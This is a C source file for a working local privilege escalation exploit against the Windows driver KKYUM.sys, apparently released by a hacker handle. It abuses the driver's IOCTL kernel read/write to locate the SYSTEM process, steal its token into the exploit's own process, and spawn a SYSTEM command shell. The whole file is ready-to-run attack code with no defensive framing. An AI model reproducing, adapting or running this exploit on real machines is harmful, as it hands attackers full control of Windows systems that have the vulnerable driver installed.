// pwn.c - KKYUM.sys LPE (HVCI ok) - _SiCk // afflicted.sh
#include <windows.h>
#include <stdio.h>
#include <stdint.h>

#define IR 0x22265c
#define IW 0x222658
#define PIDO 0x1d0
#define LNKO 0x1d8
#define TOKO 0x248

typedef NTSTATUS (NTAPI *QSI)(ULONG, PVOID, ULONG, PULONG);
static HANDLE d;

// pid-scoped copy r/w
static int io(DWORD c, uint32_t pid, uint64_t a, void *b, uint64_t n) {
    struct { uint32_t pid, cnt; struct { uint64_t r, l, s; } op; } rq = { pid, 1, a, (uint64_t)b, n };
    DWORD br;
    return DeviceIoControl(d, c, &rq, sizeof rq, &rq, sizeof rq, &br, 0);
}
#define kr(pid,a,b,n) io(IR,pid,a,b,n)
#define kw(pid,a,b,n) io(IW,pid,a,b,n)

// sedebug on -> qsi(11) unscrubbed
static uint64_t ntbase(void) {
    HANDLE t;
    TOKEN_PRIVILEGES tp = {0};
    QSI q = (QSI)GetProcAddress(GetModuleHandleA("ntdll"), "NtQuerySystemInformation");
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &t)) {
        LookupPrivilegeValueA(0, "SeDebugPrivilege", &tp.Privileges[0].Luid);
        AdjustTokenPrivileges(t, 0, &tp, 0, 0, 0);
        CloseHandle(t);
    }
    ULONG n = 0;
    q(11, 0, 0, &n);
    uint8_t *b = malloc(n * 2);
    if (!b || q(11, b, n * 2, &n) != 0) return 0;
    uint64_t r = *(uint64_t *)(b + 8 + 0x10);
    free(b);
    return r;
}

// export walk
static uint64_t fexp(uint64_t b, const char *nm) {
    uint8_t h[0x1000];
    uint32_t e, nn, ar, nr, orr, *n32, f;
    uint16_t o;
    char s[64];
    if (!kr(4, b, h, sizeof h)) return 0;
    e = *(uint32_t *)(h + 0x3c);
    e = *(uint32_t *)(h + e + 0x88);
    if (!e || !kr(4, b + e, h, 0x28)) return 0;
    nn = *(uint32_t *)(h + 0x18); ar = *(uint32_t *)(h + 0x1c);
    nr = *(uint32_t *)(h + 0x20); orr = *(uint32_t *)(h + 0x24);
    n32 = malloc(nn * 4);
    if (!kr(4, b + nr, n32, nn * 4)) { free(n32); return 0; }
    for (uint32_t i = 0; i < nn; i++) {
        if (!kr(4, b + n32[i], s, 63)) continue;
        s[63] = 0;
        if (!strcmp(s, nm)) {
            kr(4, b + orr + i * 2, &o, 2);
            kr(4, b + ar + o * 4, &f, 4);
            free(n32);
            return b + f;
        }
    }
    free(n32);
    return 0;
}

int main(void) {
    printf(" _._     _,-'\"\"`-._\n"
           "(,-.`._,'(       |\\`-/|\n"
           "    `-.-' \\ )-`( , o o)\n"
           "          `-    \\`_`\"'-   _SiCk // afflicted.sh\n\n");
    printf("[*] KKYUM.sys LPE\n");

    uint64_t nt = ntbase();
    if (!nt) { printf("[-] nt base (elevated?)\n"); return 1; }
    printf("[+] nt %llx\n", nt);

    d = CreateFileW(L"\\\\.\\KKYUM", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
    if (d == INVALID_HANDLE_VALUE) {           // service stopped -> start, retry
        system("sc start KKYUM >nul 2>&1");
        Sleep(1500);
        d = CreateFileW(L"\\\\.\\KKYUM", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
    }
    if (d == INVALID_HANDLE_VALUE) { printf("[-] dev %lu\n", GetLastError()); return 1; }
    printf("[+] dev\n");

    uint64_t pisp = fexp(nt, "PsInitialSystemProcess"), sys = 0, me = 0, st = 0, ot = 0, chk = 0;
    if (!pisp || !kr(4, pisp, &sys, 8) || !sys) { printf("[-] sys eproc\n"); return 1; }
    printf("[+] sysEproc %llx\n", sys);

    DWORD my = GetCurrentProcessId();
    for (uint64_t cur = sys, fl = 0, p = 0, i = 0; i < 4096; i++) {   // walk links
        if (!kr(4, cur + LNKO, &fl, 8)) break;
        cur = fl - LNKO;
        if (cur == sys) break;
        if (kr(4, cur + PIDO, &p, 8) && p == my) { me = cur; break; }
    }
    if (!me) { printf("[-] our eproc\n"); return 1; }

    kr(4, sys + TOKO, &st, 8);
    kr(4, me + TOKO, &ot, 8);
    if (!kw(4, me + TOKO, &st, 8) || !kr(4, me + TOKO, &chk, 8) || chk != st) {
        printf("[-] swap\n");
        return 1;
    }
    printf("[+] pid %lu eproc %llx tok %llx -> %llx\n", my, me, ot, st);

    STARTUPINFOA si = { .cb = sizeof si };
    PROCESS_INFORMATION pi;
    if (CreateProcessA(0, "cmd.exe /k whoami", 0, 0, 0, CREATE_NEW_CONSOLE, 0, 0, &si, &pi)) {
        printf("[+] SYSTEM shell (pid %lu)\n", pi.dwProcessId);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }

    Sleep(2000);
    kw(4, me + TOKO, &ot, 8);   // restore
    printf("[+] restored\n");
    return 0;
}
